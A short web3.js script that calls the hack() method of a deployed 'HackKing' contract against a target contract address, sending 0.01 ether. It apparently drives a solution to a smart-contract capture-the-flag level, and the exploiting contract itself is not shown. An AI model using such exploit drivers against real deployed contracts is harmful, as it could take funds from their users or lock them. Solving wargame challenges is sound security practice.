const { web3, web3utils, dotenv } = require("./common.js");
dotenv.config();
const abi = require("./build/contracts/HackKing.json").abi;

(async () => {
  try {
    const contract = new web3.eth.Contract(
      abi,
      "0xD677601F40bB78bfC49095fA4C3C28027CfA74e6"
    );
    await contract.methods
      .hack("0xB8f2Eddb9EbAE26BE0A9B8d5Fa797aa8249aa40A")
      .send({
        from: process.env.WALLET_ADDRESS,
        value: web3utils.toWei("0.01"),
      });
    console.log("Done");
  } catch (e) {
    console.log(e.message);
  }
})();
